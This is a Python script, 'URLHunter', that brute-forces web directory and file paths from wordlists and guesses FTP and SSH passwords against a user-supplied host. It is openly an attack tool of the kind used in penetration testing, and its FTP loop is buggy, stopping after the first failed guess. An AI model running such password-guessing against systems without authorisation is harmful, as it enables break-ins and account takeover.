import requests
import ftplib
import paramiko

author = "Karan Bhateja"
github_link = "https://github.com/karanbhateja/"
version = "1.1 Beta"

# Function to display a custom ASCII art banner
def display_banner():
    banner = f"""

    \033[31m██╗   ██╗██████╗ ██╗         ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
    \033[31m██║   ██║██╔══██╗██║         ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
    \033[33m██║   ██║██████╔╝██║         ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
    \033[33m██║   ██║██╔══██╗██║         ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    \033[91m╚██████╔╝██║  ██║███████╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
    \033[91m ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                                                                                   
                    \033[93m Author: {author}  
                    \033[93m Github: {github_link}
                    \033[93m Version: V{version}  
    """                                                        
    print(banner)
    print("            Welcome to URLHunter - Web Path and File Brute-Forcing Tool\n")                                                   
    

# Function to format the URL with a trailing slash if missing and add "http://" or "https://"
def format_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url  # Add "http://" by default if missing
    if not url.endswith("/"):
        url += "/"
    return url

# FTP Brute-Forcing Function
def ftp_bruteforce(host, username, password_file):
    try:
        with open(password_file, "r") as file:
            passwords = [line.strip() for line in file.readlines()]

        for password in passwords:
            ftp = ftplib.FTP(host)
            response = ftp.login(username, password)
            if "230" in response:
                print(f"\nFTP Brute-Forcing Succeeded. Password: {password}")
                return
    except Exception as e:
        pass

    print("\nFTP Brute-Forcing Failed.")

# SSH Brute-Forcing Function
def ssh_bruteforce(host, username, password_file):
    try:
        with open(password_file, "r") as file:
            passwords = [line.strip() for line in file.readlines()]

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for password in passwords:
            try:
                ssh.connect(host, username=username, password=password)
                print(f"\nSSH Brute-Forcing Succeeded. Password: {password}")
                ssh.close()
                return
            except Exception as e:
                pass
    except Exception as e:
        pass

    print("\nSSH Brute-Forcing Failed.")

# Display the custom banner
display_banner()

# Target URL and wordlists for directories, filenames, FTP, and SSH
target_url = input("Enter the target URL (e.g., example.com): ")
target_url = format_url(target_url)  # Ensure URL has "http://" or "https://" and a trailing slash

# Prompt the user for their choice
print("\nSelect an option:")
print("1. Directory Brute-Forcing")
print("2. File Brute-Forcing")
print("3. FTP Brute-Forcing")
print("4. SSH Brute-Forcing")
choice = input("Enter your choice (1, 2, 3, or 4): ")

if choice == "1":
    directory_wordlist_file = input("\nEnter the name of the Directory Wordlist File (e.g., directory_wordlist.txt): ")
    wordlist_file = directory_wordlist_file
    print("\nPerforming Directory Brute-Forcing...")
elif choice == "2":
    file_wordlist_file = input("\nEnter the name of the File Wordlist File (e.g., file_wordlist.txt): ")
    wordlist_file = file_wordlist_file
    print("\nPerforming File Brute-Forcing...")
elif choice == "3":
    ftp_host = input("\nEnter FTP host: ")
    ftp_username = input("Enter FTP username: ")
    ftp_password_file = input("Enter the name of the FTP password wordlist file: ")
    print("\nPerforming FTP Brute-Forcing...")
    ftp_bruteforce(ftp_host, ftp_username, ftp_password_file)
    exit()
elif choice == "4":
    ssh_host = input("\nEnter SSH host: ")
    ssh_username = input("Enter SSH username: ")
    ssh_password_file = input("Enter the name of the SSH password wordlist file: ")
    print("\nPerforming SSH Brute-Forcing...")
    ssh_bruteforce(ssh_host, ssh_username, ssh_password_file)
    exit()
else:
    print("\nInvalid choice. Please enter 1 for directory brute-forcing, 2 for file brute-forcing, 3 for FTP brute-forcing, or 4 for SSH brute-forcing.")
    exit()

# Read the selected wordlist
with open(wordlist_file, "r") as file:
    wordlist = [line.strip() for line in file.readlines()]

# Perform brute-forcing based on the user's choice
for item in wordlist:
    url = target_url + item
    response = requests.get(url)
    
    if response.status_code in [200, 301, 401, 403]:
        if choice == "1":
            print(f"\n==> {url} (Status Code: {response.status_code})")
        elif choice == "2":
            print(f"\n==> {url} (Status Code: {response.status_code})")

# Close the file
file.close()
